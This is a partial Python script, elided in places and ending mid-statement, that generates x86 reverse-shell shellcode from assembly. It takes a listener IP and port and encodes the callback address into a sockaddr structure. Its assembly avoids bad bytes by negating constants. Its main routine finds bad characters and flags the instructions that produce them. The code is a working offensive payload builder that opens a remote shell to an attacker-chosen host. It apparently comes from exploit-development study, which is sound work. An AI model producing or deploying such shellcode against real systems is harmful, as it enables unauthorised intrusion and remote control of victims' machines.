...
def rev_shellcode(rev_ip_addr, rev_port, breakpoint=0):
    ...
    asm = [
        ...
        "       mov edx, 0xfffffff4             ;", # avoid 0x0c as badbyte
        "       neg edx                         ;",
        ...
        "       mov edx, 0xffffffe0             ;", # avoid 0x20 as badbyte
        "       neg edx                         ;",
        ...
        "       mov cx, ax                      ;",  # Extrapolate the function's ordinal
        # "       mov cx, [edx+2*ecx]             ;",  # Extrapolate the function's ordinal | cx produces badbyte 0c
        ...
        "       push eax                        ;",  # Push sin_zero[]
        "       mov ecx, 0x8efaaaf6             ;",  # avoid bad byte in ipaddr (10.85.5.113=0x7105550a which has 0a, so push negative)
        "       neg ecx                         ;",  # 
        "       push ecx                         ;",  # push sin_addr
...
def main(args):
    ...
    encoding, count = assembler.asm(shellcode)
    ...
    # Check for bad chars and identify which instruction(s) generated them
    for bad in args.bad_chars:
        bad_pattern = "\\x" + bad
        if bad_pattern in final:
            print(f"[!] Found 0x{bad} in final shellcode")
            sentry = True
    
    if sentry:
        print(f"\n[!] Analyzing which instructions contain bad bytes...\n")
        
        # Split shellcode into individual instructions
        shellcode_lines = [line.strip() for line in shellcode.split('\n') if line.strip() and not line.strip().startswith('#')]
        
        bad_instruction_found = False
        for line in shellcode_lines:
            # Skip labels (lines ending with ':')
            if ':' in line and not line.strip().startswith(';'):
                # Check if it's a label (no opcodes before the colon)
                parts = line.split(':')
                if len(parts) == 2 and parts[1].strip() == '' or parts[1].strip().startswith(';'):
                    continue
            
            # Try to assemble this single instruction
            try:
                inst_encoding, inst_count = assembler.asm(line)
                if inst_encoding:
                    # Convert to hex string format
                    inst_hex = ""
                    for byte in inst_encoding:
                        inst_hex += "\\x{0:02x}".format(byte)
                    
                    # Check if any bad char is in this instruction
                    contains_bad = False
                    bad_chars_in_inst = []
                    for bad in args.bad_chars:
                        if bad in inst_hex:
                            contains_bad = True
                            bad_chars_in_inst.append(bad)
                    
                    if contains_bad:
                        bad_instruction_found = True
                        print(f"[!] Bad byte(s) {', '.join(['0x' + b for b in bad_chars_in_inst])} found in:")
                        print(f"    Instruction: {line}")
                        print(f"    Encodes to:  {inst_hex}")
                        print()
            except Exception as e:
                # Skip instructions that can't be assembled individually (might be part of multi-line construct)
                pass
    ...
    print(f"[!] This assumes the following badbytes: 00 09 0a 0b 0c 0d 20")
    print(f"[=]   len:   {len(encoding)} bytes")
    print(f"[=]   lhost: {args.lhost}")
    print(f"[=]   lport: {args.lport}")
    print(f'[=]   IP will be: {to_sin_ip(args.lhost)}')
    print(f'[=]   Port will be: {to_sin_ip(args.lport)}')
    print(
